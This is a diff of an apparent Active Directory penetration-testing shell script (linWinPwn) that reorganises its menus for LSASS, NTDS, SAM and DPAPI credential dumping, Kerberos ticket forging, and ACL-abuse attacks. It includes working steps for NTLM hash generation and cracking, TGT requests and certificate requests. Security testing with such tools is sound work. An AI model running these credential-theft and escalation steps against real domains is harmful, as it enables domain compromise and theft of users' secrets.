-        shadowcoerce_check
-        vulns_menu
-        ;;
-
-        11)
-        smbsigning_check
-        vulns_menu
-        ;;
-
-        12)
-        ntlmv1_check
-        vulns_menu
-        ;;
-
-        13)
-        runasppl_check
-        vulns_menu
-        ;;
-
-        14)
-        rpcdump_check
-        vulns_menu
-        ;;
-
-        15)
-        coercer_check
-        vulns_menu
-        ;;
-
-        16)
-        certifried_check
-        vulns_menu
-        ;;
-
-        back)
-        main_menu
-        ;;
-
-        *)
-        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
-        echo -e ""
-        vulns_menu
-        ;;
-    esac
-}
-
-pwd_menu () {
-    echo -e ""
-    echo -e "${CYAN}[Password Dump menu]${NC} Please choose from the following options:"
-    echo -e "--------------------------------------------------------------"
-    echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
-    echo -e "A) ALL PASSWORD DUMPS"
-    echo -e "m) Modify target(s)"
-    echo -e "1) LAPS Dump using netexec"
-    echo -e "2) gMSA Dump using netexec"
-    echo -e "3) DCSync using secretsdump (only on DC)"
-    echo -e "4) Dump SAM and LSA using secretsdump"
-    echo -e "5) Dump SAM and SYSTEM using reg"
-    echo -e "6) Dump NTDS using netexec"
-    echo -e "7) Dump SAM using netexec"
-    echo -e "8) Dump LSA secrets using netexec"
-    echo -e "9) Dump LSASS using lsassy"
-    echo -e "10) Dump LSASS using handlekatz"
-    echo -e "11) Dump LSASS using procdump"
-    echo -e "12) Dump LSASS using nanodump"
-    echo -e "13) Dump LSASS using masky (ADCS required)"
-    echo -e "14) Dump dpapi secrets using netexec"
-    echo -e "15) Dump secrets using DonPAPI"
-    echo -e "16) Dump NTDS using certsync (ADCS required) (only on DC)"
-    echo -e "17) Dump secrets using hekatomb (only on DC)"
-    echo -e "18) Search for juicy credentials (Firefox, KeePass, Rdcman, Teams, WiFi, WinScp)"
-    echo -e "19) Dump Veeam credentials (only from Veeam server)"
-    echo -e "20) Dump Msol password (only from Azure AD-Connect server)"
-    echo -e "21) Extract Bitlocker Keys"
-    echo -e "back) Go back"
-
-    read -p "> " option_selected </dev/tty
-
-    case ${option_selected} in
-        A)
-        pwd_dump
-        pwd_menu
-        ;;
-
-        m)
-        modify_target
-        pwd_menu
-        ;;
-
-        1)
-        laps_dump
-        pwd_menu
-        ;;
-
-        2)
-        gmsa_dump
-        pwd_menu
-        ;;
-
-        3)
-        secrets_dump_dcsync
-        pwd_menu
-        ;;
-
-        4)
-        secrets_dump
-        pwd_menu
-        ;;
-
-        5)
-        samsystem_dump
-        pwd_menu
-        ;;
-
-        6)
-        ntds_dump
-        pwd_menu
-        ;;
-
-        7)
-        sam_dump
-        pwd_menu
-        ;;
+        asreprc4_attack
+        kerberos_menu;;
 
         8)
-        lsa_dump
-        pwd_menu
-        ;;
+        krbjack_attack
+        kerberos_menu;;
 
         9)
-        lsassy_dump
-        pwd_menu
-        ;;
+        kerborpheus_attack
+        kerberos_menu;;
 
         10)
-        handlekatz_dump
-        pwd_menu
-        ;;
-
-        11)
-        procdump_dump
-        pwd_menu
-        ;;
-
-        12)
-        nanodump_dump
-        pwd_menu
-        ;;
-
-        13)
-        masky_dump
-        pwd_menu
-        ;;
-
-        14)
-        dpapi_dump
-        pwd_menu
-        ;;
-
-        15)
-        donpapi_dump
-        pwd_menu
-        ;;
-
-        16)
-        certsync_ntds_dump
-        pwd_menu
-        ;;
-
-        17)
-        hekatomb_dump
-        pwd_menu
-        ;;
-
-        18)
-        juicycreds_dump
-        pwd_menu
-        ;;
-
-        19)
-        veeam_dump
-        pwd_menu
-        ;;
-
-        20)
-        msol_dump
-        pwd_menu
-        ;;
-
-        21)
-        bitlocker_dump
-        pwd_menu
-        ;;
-
-        back)
-        main_menu
-        ;;
-
-        *)
-        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
-        echo -e ""
-        pwd_menu
-        ;;
-    esac
-}
-
-console_menu () {
-    echo -e ""
-    echo -e "${CYAN}[LDAP console menu]${NC} Please choose from the following options:"
-    echo -e "----------------------------------------------------------------"
-    echo -e "1) Certipy LDAP shell via Schannel (using Certificate Authentication)"
-    echo -e "2) p0dalirius' LDAP Console"
-    echo -e "3) p0dalirius' LDAP Monitor"
-    echo -e "4) garrettfoster13's ACED"
-    echo -e "5) LDAPPER custom options"
-    echo -e "back) Go back"
-
-    read -p "> " option_selected </dev/tty
-
-    case ${option_selected} in
-        1)
-        certipy_ldapshell
-        console_menu
-        ;;
-
-        2)
-        ldap_console
-        console_menu
-        ;;
-
-        3)
-        ldap_monitor
-        console_menu
-        ;;
-
-        4)
-        aced_console
-        console_menu
-        ;;
-
-        5)
-        ldapper_console
-        console_menu
-
-        ;;
-        back)
-        main_menu
-        ;;
-
-        *)
-        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
-        echo -e ""
-        ad_menu
-        ;;
-    esac
-}
-
-init_menu () {
-    echo -e ""
-    echo -e "${YELLOW}[Init menu]${NC} Please choose from the following options:"
-    echo -e "----------------------------------------------------"
-    echo -e "ENTER) Launch linWinPwn in interactive mode"
-    echo -e "A) Authentication Menu"
-    echo -e "C) Configuration Menu"
-
-    read -p "> " option_selected </dev/tty
-
-    case ${option_selected} in
-        C)
-        config_menu
-        ;;
-
-        A)
-        auth_menu
-        ;;  
-
-        "")
-        dns_enum
-        main_menu
-        ;;
-
-        *)
-        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
-        init_menu
-        ;;
-    esac
-}
-
-auth_menu () {
-    echo -e ""
-    echo -e "${YELLOW}[Auth menu]${NC} Please choose from the following options:"
-    echo -e "----------------------------------------------------"
-    echo -e "1) Generate and use NTLM hash of current user (requires: password) - Pass the hash"
-    echo -e "2) Crack NTLM hash of current user and use password (requires: NTLM hash)"
-    echo -e "3) Generate and use TGT for current user (requires: password, NTLM hash or AES key) - Pass the key/Overpass the hash"
-    echo -e "4) Extract NTLM hash from Certificate using PKINIT (requires: pfx certificate)"
-    echo -e "5) Request and use certificate (requires: authenticated)"
-    echo -e "6) Generate Golden Ticket (requires: password or NTLM hash of Domain Admin)"
-    echo -e "7) Generate Silver Ticket (requires: password or NTLM hash of Domain Admin)"
-    echo -e "8) Generate Diamond Ticket (requires: password or NTLM hash of Domain Admin)"
-    echo -e "9) Generate Sapphire Ticket (requires: password or NTLM hash of Domain Admin)"
-    echo -e "back) Go back to Init Menu"
-
-    read -p "> " option_selected </dev/tty
-
-    case ${option_selected} in
-        C)
-        config_menu
-        ;;
-
-        A)
-        auth_menu
-        ;;  
-
-        1)
-        if [ "${pass_bool}" == true ] ; then
-            hash=":$(iconv -f ASCII -t UTF-16LE <(printf ${password}) | $(which openssl) dgst -md4 | cut -d " " -f 2)"
-            echo -e "${GREEN}[+] NTLM hash generated:${NC} $hash"
-            pass_bool=false
-            hash_bool=true
-            authenticate
-        else
-            echo -e "${RED}[-] Error! Requires password...${NC}"
-        fi
-        auth_menu
-        ;;
-
-        2)
-        if [ ! -f "${john}" ] ; then
-            echo -e "${RED}[-] Please verify the installation of john${NC}"
-        else
-            if [ "${hash_bool}" == true ] ; then
-                echo $hash | cut -d ":" -f 2 > ${output_dir}/Credentials/ntlm_hash
-                echo -e "${CYAN}[*] Cracking NTLM hash using john the ripper${NC}"
-                run_command "$john ${output_dir}/Credentials/ntlm_hash --format=NT --wordlist=$pass_wordlist" | tee "${output_dir}/Credentials/johnNTLM_output_${dc_domain}"
-                john_out=$($john ${output_dir}/Credentials/ntlm_hash --format=NT --show)
-                if [[ "${john_out}" == *"1 password"* ]]; then
-                    pass_bool=true
-                    hash_bool=false
-                    password=$(echo $john_out | cut -d ":" -f 2 | cut -d " " -f 1)
-                    echo -e "${GREEN}[+] NTLM hash successfully cracked:${NC} $password"
-                    authenticate
-                else
-                    echo -e "${RED}[-] Failed to crack NTLM hash${NC}"
-                fi
-            else
-                echo -e "${RED}[-] Error! Requires NTLM hash...${NC}"
-            fi
-        fi
-        auth_menu
-        ;;
-
-        3)
-        if [ ! -f "${impacket_getTGT}" ]; then
-            echo -e "${RED}[-] getTGT.py not found! Please verify the installation of impacket${NC}"
-        else
-            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
-                current_dir=$(pwd)
-                cd ${output_dir}/Credentials
-                echo -e "${CYAN}[*] Requesting TGT for current user${NC}"
-                run_command "${impacket_getTGT} ${argument_imp} -dc-ip ${dc_ip}" | grep -v "Impacket" | sed '/^$/d' | tee "${output_dir}/Credentials/getTGT_output_${dc_domain}"
-                cd ${current_dir}
-                if [ -f "${output_dir}/Credentials/${user}.ccache" ]; then
-                    krb5cc="${output_dir}/Credentials/${user}.ccache"
-                    pass_bool=false
-                    hash_bool=false
-                    aeskey_bool=false
-                    cert_bool=false
-                    kerb_bool=true
-                    echo -e "${GREEN}[+] TGT generated successfully:${NC} $krb5cc"
-                    authenticate
-                else
-                    echo -e "${RED}[-] Failed to generate TGT${NC}"
-                fi
-            else
-                echo -e "${RED}[-] Error! Requires password, NTLM hash or AES key...${NC}"
-            fi
-        fi
-        auth_menu
-        ;;
-
-        4)
-        if [[ ! -f "${certipy}" ]] ; then
-            echo -e "${RED}[-] Please verify the installation of certipy${NC}"
-        else
-            if [[ ${cert_bool} == false ]]; then
-                echo -e "Please specify location of certificate file:"
-                read -p ">> " pfxcert </dev/tty
-                while [ ! -s "${pfxcert}" ] ; do
-                    echo -e "${RED}Invalid pfx file.${NC} Please specify location of certificate file:"
-                    read -p ">> " pfxcert </dev/tty
-                done
-                if [[ ${pfxpass} == "" ]]; then
-                    echo -e "Please specify password of certificate file (press Enter if no password):"
-                    read -p ">> " pfxpass </dev/tty
-                fi
-            fi
-            echo -e "${CYAN}[*] Extracting NTLM hash from certificate using PKINIT${NC}"
-            pass_bool=false
-            hash_bool=false
-            aeskey_bool=false
-            kerb_bool=false
-            unset KRB5CCNAME
-            cert_bool=true
-            authenticate
-        fi
-        echo -e ""
-        auth_menu
-        ;;
-
-        5)
-        if [[ ! -f "${certipy}" ]] ; then
-            echo -e "${RED}[-] Please verify the installation of certipy${NC}"
-        else
-            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ] || [ "${kerb_bool}" == true ] ; then
-                ne_adcs_enum
-                current_dir=$(pwd)
-                cd ${output_dir}/Credentials
-                i=0
-                for pki_server in $pki_servers; do
-                    i=$((i + 1))
-                    pki_ca=$(echo -e $pki_cas | sed -n ${i}p)
-                    run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -target ${pki_server} -ca ${pki_ca} -template User" | tee "${output_dir}/Credentials/certipy_reqcert_output_${dc_domain}.txt"
-                done
-                cd ${current_dir}
-                if [ -f "${output_dir}/Credentials/${user}.pfx" ]; then
-                    pfxcert="${output_dir}/Credentials/${user}.pfx"
-                    pfxpass=""
-                    echo -e "${GREEN}[+] PFX Certificate requested successfully:${NC} ${output_dir}/Credentials/${user}.pfx"
-                    $(which openssl) pkcs12 -in "${output_dir}/Credentials/${user}.pfx" -out "${output_dir}/Credentials/${user}.pem" -nodes -passin pass:""
-                    if [ -f "${output_dir}/Credentials/${user}.pem" ]; then
-                        pem_cert="${output_dir}/Credentials/${user}.pem"
-                        echo -e "${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} ${output_dir}/Credentials/${user}.pem"
-                    fi
-                    pass_bool=false
-                    hash_bool=false
-                    aeskey_bool=false
-                    cert_bool=true
-                    kerb_bool=false
-                    unset KRB5CCNAME
-                    authenticate
-                else
-                    echo -e "${RED}[-] Failed to request certificate${NC}"
-                fi
-            else
-                echo -e "${RED}[-] Error! Requires password, NTLM hash, AES key or Kerberos ticket...${NC}"                
-            fi
-        fi
-        auth_menu
-        ;;
-        
-        6)
         if [ ! -f "${impacket_ticketer}" ]; then
             echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
         else
@@ -3438,10 +3170,9 @@ auth_menu () {
                 echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
             fi
         fi
-        auth_menu
-        ;;
+        kerberos_menu;;
 
-        7)
+        11)
         if [ ! -f "${impacket_ticketer}" ]; then
             echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
         else
@@ -3515,10 +3246,9 @@ auth_menu () {
                 echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
             fi
         fi
-        auth_menu
-        ;;
+        kerberos_menu;;
         
-        8)
+        12)
         if [ ! -f "${impacket_ticketer}" ]; then
             echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
         else
@@ -3569,10 +3299,9 @@ auth_menu () {
                 echo -e "${RED}[-] Error! Requires password or NTLM hash...${NC}"
             fi
         fi
-        auth_menu
-        ;;
+        kerberos_menu;;
         
-        9)
+        13)
         if [ ! -f "${impacket_ticketer}" ]; then
             echo -e "${RED}[-] ticketer.py not found! Please verify the installation of impacket${NC}"
         else
@@ -3627,17 +3356,580 @@ auth_menu () {
                 echo -e "${RED}[-] Error! Requires password...${NC}"
             fi
         fi
-        auth_menu
-        ;;
+        kerberos_menu;;
 
         back)
-        init_menu
-        ;;
+        main_menu;;
 
         *)
         echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
-        auth_menu
-        ;;
+        echo -e ""
+        kerberos_menu;;
+    esac
+}
+
+shares_menu () {
+    echo -e ""
+    echo -e "${CYAN}[SMB Shares menu]${NC} Please choose from the following options:"
+    echo -e "-----------------------------------------------------------"
+    echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
+    echo -e "A) ALL SMB SHARES SCANS"
+    echo -e "m) Modify target(s)"
+    echo -e "1) SMB shares Scan using smbmap"
+    echo -e "2) SMB shares Enumeration using netexec"
+    echo -e "3) SMB shares Spidering using netexec "
+    echo -e "4) SMB shares Scan using FindUncommonShares"
+    echo -e "5) SMB shares Scan using manspider"
+    echo -e "back) Go back"
+
+    read -p "> " option_selected </dev/tty
+
+    case ${option_selected} in
+        A)
+        scan_shares
+        shares_menu;;
+
+        m)
+        modify_target
+        shares_menu;;
+
+        1)
+        smb_map
+        shares_menu;;
+
+        2)
+        ne_shares
+        shares_menu;;
+
+        3)
+        ne_spider
+        shares_menu;;
+
+        4)
+        finduncshar_scan
+        shares_menu;;
+
+        5)
+        manspider_scan
+        shares_menu;;
+
+        back)
+        main_menu;;
+
+        *)
+        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
+        echo -e ""
+        shares_menu;;
+    esac
+ 
+}
+
+vulns_menu () {
+    echo -e ""
+    echo -e "${CYAN}[Vuln Checks menu]${NC} Please choose from the following options:"
+    echo -e "------------------------------------------------------------"
+    echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
+    echo -e "A) ALL VULNERABILITY CHECKS"
+    echo -e "m) Modify target(s)"
+    echo -e "1) zerologon check using netexec (only on DC)"
+    echo -e "2) MS17-010 check using netexec"
+    echo -e "3) PetitPotam check using netexec (only on DC)"
+    echo -e "4) dfscoerce check using netexec (only on DC)"
+    echo -e "5) Print Spooler check using netexec"
+    echo -e "6) Printnightmare check using netexec"
+    echo -e "7) WebDAV check using netexec"
+    echo -e "8) shadowcoerce check using netexec"
+    echo -e "9) SMB signing check using netexec"
+    echo -e "10) ntlmv1 check using netexec"
+    echo -e "11) runasppl check using netexec"
+    echo -e "12) RPC Dump and check for interesting protocols"
+    echo -e "13) Coercer RPC scan"
+    echo -e "back) Go back"
+
+    read -p "> " option_selected </dev/tty
+
+    case ${option_selected} in
+        A)
+        vuln_checks
+        vulns_menu;;
+
+        m)
+        modify_target
+        vulns_menu;;
+
+        1)
+        zerologon_check
+        vulns_menu;;
+
+        2)
+        ms17-010_check
+        vulns_menu;;
+
+        3)
+        petitpotam_check
+        vulns_menu;;
+
+        4)
+        dfscoerce_check
+        vulns_menu;;
+
+        5)
+        spooler_check
+        vulns_menu;;
+
+        6)
+        printnightmare_check
+        vulns_menu;;
+
+        7)
+        webdav_check
+        vulns_menu;;
+
+        8)
+        shadowcoerce_check
+        vulns_menu;;
+
+        9)
+        smbsigning_check
+        vulns_menu;;
+
+        10)
+        ntlmv1_check
+        vulns_menu;;
+
+        11)
+        runasppl_check
+        vulns_menu;;
+
+        12)
+        rpcdump_check
+        vulns_menu;;
+
+        13)
+        coercer_check
+        vulns_menu;;
+
+        back)
+        main_menu;;
+
+        *)
+        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
+        echo -e ""
+        vulns_menu;;
+    esac
+}
+
+mssql_menu () {
+    echo -e ""
+    echo -e "${CYAN}[MSSQL Enumeration menu]${NC} Please choose from the following options:"
+    echo -e "------------------------------------------------------------------"
+    echo -e "1) MSSQL Enumeration using netexec"
+    echo -e "2) MSSQL Relay check"
+    echo -e "back) Go back"
+
+    read -p "> " option_selected </dev/tty
+
+    case ${option_selected} in
+        1)
+        mssql_enum
+        mssql_menu;;
+
+        2)
+        mssql_relay_check
+        mssql_menu;;
+
+        back)
+        main_menu;;
+
+        *)
+        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
+        echo -e ""
+        mssql_menu;;
+    esac
+}
+
+pwd_menu () {
+    echo -e ""
+    echo -e "${CYAN}[Password Dump menu]${NC} Please choose from the following options:"
+    echo -e "--------------------------------------------------------------"
+    echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
+    echo -e "A) ALL PASSWORD DUMPS"
+    echo -e "m) Modify target(s)"
+    echo -e "1) LAPS Dump using netexec"
+    echo -e "2) gMSA Dump using netexec"
+    echo -e "3) DCSync using secretsdump (only on DC)"
+    echo -e "4) Dump SAM and LSA using secretsdump"
+    echo -e "5) Dump SAM and SYSTEM using reg"
+    echo -e "6) Dump NTDS using netexec"
+    echo -e "7) Dump SAM using netexec"
+    echo -e "8) Dump LSA secrets using netexec"
+    echo -e "9) Dump LSASS using lsassy"
+    echo -e "10) Dump LSASS using handlekatz"
+    echo -e "11) Dump LSASS using procdump"
+    echo -e "12) Dump LSASS using nanodump"
+    echo -e "13) Dump LSASS using masky (ADCS required)"
+    echo -e "14) Dump dpapi secrets using netexec"
+    echo -e "15) Dump secrets using DonPAPI"
+    echo -e "16) Dump NTDS using certsync (ADCS required) (only on DC)"
+    echo -e "17) Dump secrets using hekatomb (only on DC)"
+    echo -e "18) Search for juicy credentials (Firefox, KeePass, Rdcman, Teams, WiFi, WinScp)"
+    echo -e "19) Dump Veeam credentials (only from Veeam server)"
+    echo -e "20) Dump Msol password (only from Azure AD-Connect server)"
+    echo -e "21) Extract Bitlocker Keys"
+    echo -e "22) Privilege escalation from Child Domain to Parent Domain using raiseChild"
+    echo -e "back) Go back"
+
+    read -p "> " option_selected </dev/tty
+
+    case ${option_selected} in
+        A)
+        pwd_dump
+        pwd_menu;;
+
+        m)
+        modify_target
+        pwd_menu;;
+
+        1)
+        laps_dump
+        pwd_menu;;
+
+        2)
+        gmsa_dump
+        pwd_menu;;
+
+        3)
+        secrets_dump_dcsync
+        pwd_menu;;
+
+        4)
+        secrets_dump
+        pwd_menu;;
+
+        5)
+        samsystem_dump
+        pwd_menu;;
+
+        6)
+        ntds_dump
+        pwd_menu;;
+
+
+        7)
+        sam_dump
+        pwd_menu;;
+
+        8)
+        lsa_dump
+        pwd_menu;;
+
+        9)
+        lsassy_dump
+        pwd_menu;;
+
+        10)
+        handlekatz_dump
+        pwd_menu;;
+
+        11)
+        procdump_dump
+        pwd_menu;;
+
+        12)
+        nanodump_dump
+        pwd_menu;;
+
+        13)
+        masky_dump
+        pwd_menu;;
+
+        14)
+        dpapi_dump
+        pwd_menu;;
+
+        15)
+        donpapi_dump
+        pwd_menu;;
+
+        16)
+        certsync_ntds_dump
+        pwd_menu;;
+
+        17)
+        hekatomb_dump
+        pwd_menu;;
+
+        18)
+        juicycreds_dump
+        pwd_menu;;
+
+        19)
+        veeam_dump
+        pwd_menu;;
+
+        20)
+        msol_dump
+        pwd_menu;;
+
+        21)
+        bitlocker_dump
+        pwd_menu;;
+
+        22)
+        raise_child
+        pwd_menu;;
+
+        back)
+        main_menu;;
+
+        *)
+        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
+        echo -e ""
+        pwd_menu;;
+    esac
+}
+
+modif_menu () {
+    echo -e ""
+    echo -e "${CYAN}[Modification menu]${NC} Please choose from the following options:"
+    echo -e "-------------------------------------------------------------"
+    echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
+    echo -e "m) Modify target(s)"
+    echo -e "1) Targeted Kerberoast Attack (Noisy!)"
+    echo -e "2) Change user or computer password (Requires: ForceChangePassword on user or computer)"
+    echo -e "3) Add user to group (Requires: GenericWrite or GenericAll on group)"
+    echo -e "4) Add new computer (Requires: MAQ > 0)"
+    echo -e "5) Perform RBCD attack (Requires: GenericWrite or GenericAll on computer)"
+    echo -e "6) Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)"
+    echo -e "7) Abuse GPO to execute command (Requires: GenericWrite or GenericAll on GPO)"
+    echo -e "back) Go back"
+
+    read -p "> " option_selected </dev/tty
+
+    case ${option_selected} in
+        1)
+        targetedkerberoast_attack
+        modif_menu;;
+
+        2)
+        change_pass
+        modif_menu;;
+
+        3)
+        add_group_member
+        modif_menu;;
+
+        4)
+        add_computer
+        modif_menu;;
+
+        5)
+        rbcd_attack
+        modif_menu;;
+
+        6)
+        shadowcreds_attack
+        modif_menu;;
+
+        7)
+        pygpo_abuse
+        modif_menu;;
+
+        back)
+        main_menu;;
+
+        *)
+        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
+        echo -e ""
+        modif_menu;;
+    esac
+}
+
+init_menu () {
+    echo -e ""
+    echo -e "${YELLOW}[Init menu]${NC} Please choose from the following options:"
+    echo -e "----------------------------------------------------"
+    echo -e "ENTER) Launch linWinPwn in interactive mode"
+    echo -e "A) Authentication Menu"
+    echo -e "C) Configuration Menu"
+
+    read -p "> " option_selected </dev/tty
+
+    case ${option_selected} in
+        C)
+        config_menu;;
+
+        A)
+        auth_menu;;  
+
+        "")
+        dns_enum
+        main_menu;;
+
+        *)
+        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
+        init_menu;;
+    esac
+}
+
+auth_menu () {
+    echo -e ""
+    echo -e "${YELLOW}[Auth menu]${NC} Please choose from the following options:"
+    echo -e "----------------------------------------------------"
+    echo -e "1) Generate and use NTLM hash of current user (requires: password) - Pass the hash"
+    echo -e "2) Crack NTLM hash of current user and use password (requires: NTLM hash)"
+    echo -e "3) Generate and use TGT for current user (requires: password, NTLM hash or AES key) - Pass the key/Overpass the hash"
+    echo -e "4) Extract NTLM hash from Certificate using PKINIT (requires: pfx certificate)"
+    echo -e "5) Request and use certificate (requires: authentication)"
+    echo -e "back) Go back to Init Menu"
+
+    read -p "> " option_selected </dev/tty
+
+    case ${option_selected} in
+        C)
+        config_menu;;
+
+        A)
+        auth_menu;;  
+
+        1)
+        if [ "${pass_bool}" == true ] ; then
+            hash=":$(iconv -f ASCII -t UTF-16LE <(printf ${password}) | $(which openssl) dgst -md4 | cut -d " " -f 2)"
+            echo -e "${GREEN}[+] NTLM hash generated:${NC} $hash"
+            pass_bool=false
+            hash_bool=true
+            authenticate
+        else
+            echo -e "${RED}[-] Error! Requires password...${NC}"
+        fi
+        auth_menu;;
+
+        2)
+        if [ ! -f "${john}" ] ; then
+            echo -e "${RED}[-] Please verify the installation of john${NC}"
+        else
+            if [ "${hash_bool}" == true ] ; then
+                echo $hash | cut -d ":" -f 2 > ${output_dir}/Credentials/ntlm_hash
+                echo -e "${CYAN}[*] Cracking NTLM hash using john the ripper${NC}"
+                run_command "$john ${output_dir}/Credentials/ntlm_hash --format=NT --wordlist=$pass_wordlist" | tee "${output_dir}/Credentials/johnNTLM_output_${dc_domain}"
+                john_out=$($john ${output_dir}/Credentials/ntlm_hash --format=NT --show)
+                if [[ "${john_out}" == *"1 password"* ]]; then
+                    pass_bool=true
+                    hash_bool=false
+                    password=$(echo $john_out | cut -d ":" -f 2 | cut -d " " -f 1)
+                    echo -e "${GREEN}[+] NTLM hash successfully cracked:${NC} $password"
+                    authenticate
+                else
+                    echo -e "${RED}[-] Failed to crack NTLM hash${NC}"
+                fi
+            else
+                echo -e "${RED}[-] Error! Requires NTLM hash...${NC}"
+            fi
+        fi
+        auth_menu;;
+
+        3)
+        if [ ! -f "${impacket_getTGT}" ]; then
+            echo -e "${RED}[-] getTGT.py not found! Please verify the installation of impacket${NC}"
+        else
+            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
+                current_dir=$(pwd)
+                cd ${output_dir}/Credentials
+                echo -e "${CYAN}[*] Requesting TGT for current user${NC}"
+                run_command "${impacket_getTGT} ${argument_imp} -dc-ip ${dc_ip}" | grep -v "Impacket" | sed '/^$/d' | tee "${output_dir}/Credentials/getTGT_output_${dc_domain}"
+                cd ${current_dir}
+                if [ -f "${output_dir}/Credentials/${user}.ccache" ]; then
+                    krb5cc="${output_dir}/Credentials/${user}.ccache"
+                    pass_bool=false
+                    hash_bool=false
+                    aeskey_bool=false
+                    cert_bool=false
+                    kerb_bool=true
+                    echo -e "${GREEN}[+] TGT generated successfully:${NC} $krb5cc"
+                    authenticate
+                else
+                    echo -e "${RED}[-] Failed to generate TGT${NC}"
+                fi
+            else
+                echo -e "${RED}[-] Error! Requires password, NTLM hash or AES key...${NC}"
+            fi
+        fi
+        auth_menu;;
+
+        4)
+        if [[ ! -f "${certipy}" ]] ; then
+            echo -e "${RED}[-] Please verify the installation of certipy${NC}"
+        else
+            if [[ ${cert_bool} == false ]]; then
+                echo -e "Please specify location of certificate file:"
+                read -p ">> " pfxcert </dev/tty
+                while [ ! -s "${pfxcert}" ] ; do
+                    echo -e "${RED}Invalid pfx file.${NC} Please specify location of certificate file:"
+                    read -p ">> " pfxcert </dev/tty
+                done
+                if [[ ${pfxpass} == "" ]]; then
+                    echo -e "Please specify password of certificate file (press Enter if no password):"
+                    read -p ">> " pfxpass </dev/tty
+                fi
+            fi
+            echo -e "${CYAN}[*] Extracting NTLM hash from certificate using PKINIT${NC}"
+            pass_bool=false
+            hash_bool=false
+            aeskey_bool=false
+            kerb_bool=false
+            unset KRB5CCNAME
+            cert_bool=true
+            authenticate
+        fi
+        echo -e ""
+        auth_menu;;
+
+        5)
+        if [[ ! -f "${certipy}" ]] ; then
+            echo -e "${RED}[-] Please verify the installation of certipy${NC}"
+        else
+            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ] || [ "${kerb_bool}" == true ] ; then
+                ne_adcs_enum
+                current_dir=$(pwd)
+                cd ${output_dir}/Credentials
+                i=0
+                for pki_server in $pki_servers; do
+                    i=$((i + 1))
+                    pki_ca=$(echo -e $pki_cas | sed -n ${i}p)
+                    run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp -target ${pki_server} -ca ${pki_ca} -template User" | tee "${output_dir}/Credentials/certipy_reqcert_output_${dc_domain}.txt"
+                done
+                cd ${current_dir}
+                if [ -f "${output_dir}/Credentials/${user}.pfx" ]; then
+                    pfxcert="${output_dir}/Credentials/${user}.pfx"
+                    pfxpass=""
+                    echo -e "${GREEN}[+] PFX Certificate requested successfully:${NC} ${output_dir}/Credentials/${user}.pfx"
+                    $(which openssl) pkcs12 -in "${output_dir}/Credentials/${user}.pfx" -out "${output_dir}/Credentials/${user}.pem" -nodes -passin pass:""
+                    if [ -f "${output_dir}/Credentials/${user}.pem" ]; then
+                        pem_cert="${output_dir}/Credentials/${user}.pem"
+                        echo -e "${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} ${output_dir}/Credentials/${user}.pem"
+                    fi
+                    pass_bool=false
+                    hash_bool=false
+                    aeskey_bool=false
+                    cert_bool=true
+                    kerb_bool=false
+                    unset KRB5CCNAME
+                    authenticate
+                else
+                    echo -e "${RED}[-] Failed to request certificate${NC}"
+                fi
+            else
+                echo -e "${RED}[-] Error! Requires password, NTLM hash, AES key or Kerberos ticket...${NC}"                
+            fi
+        fi
+        auth_menu;;
+
+        back)
+        init_menu;;
+
+        *)
+        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
+        auth_menu;;
     esac
 }
 
@@ -3671,6 +3963,7 @@ config_menu () {
         if [ ! -f "${impacket_rpcdump}" ] ; then echo -e "${RED}[-] impacket's rpcdump is not installed${NC}"; else echo -e "${GREEN}[+] impacket's rpcdump is installed${NC}"; fi
         if [ ! -f "${impacket_reg}" ] ; then echo -e "${RED}[-] impacket's reg is not installed${NC}"; else echo -e "${GREEN}[+] impacket's reg is installed${NC}"; fi
         if [ ! -f "${impacket_ticketer}" ] ; then echo -e "${RED}[-] impacket's ticketer is not installed${NC}"; else echo -e "${GREEN}[+] impacket's ticketer is installed${NC}"; fi
+        if [ ! -f "${impacket_raiseChild}" ] ; then echo -e "${RED}[-] impacket's raiseChild is not installed${NC}"; else echo -e "${GREEN}[+] impacket's raiseChild is installed${NC}"; fi
         if [ ! -f "${bloodhound}" ] ; then echo -e "${RED}[-] bloodhound is not installed${NC}"; else echo -e "${GREEN}[+] bloodhound is installed${NC}"; fi
         if [ ! -f "${ldapdomaindump}" ] ; then echo -e "${RED}[-] ldapdomaindump is not installed${NC}"; else echo -e "${GREEN}[+] ldapdomaindump is installed${NC}"; fi
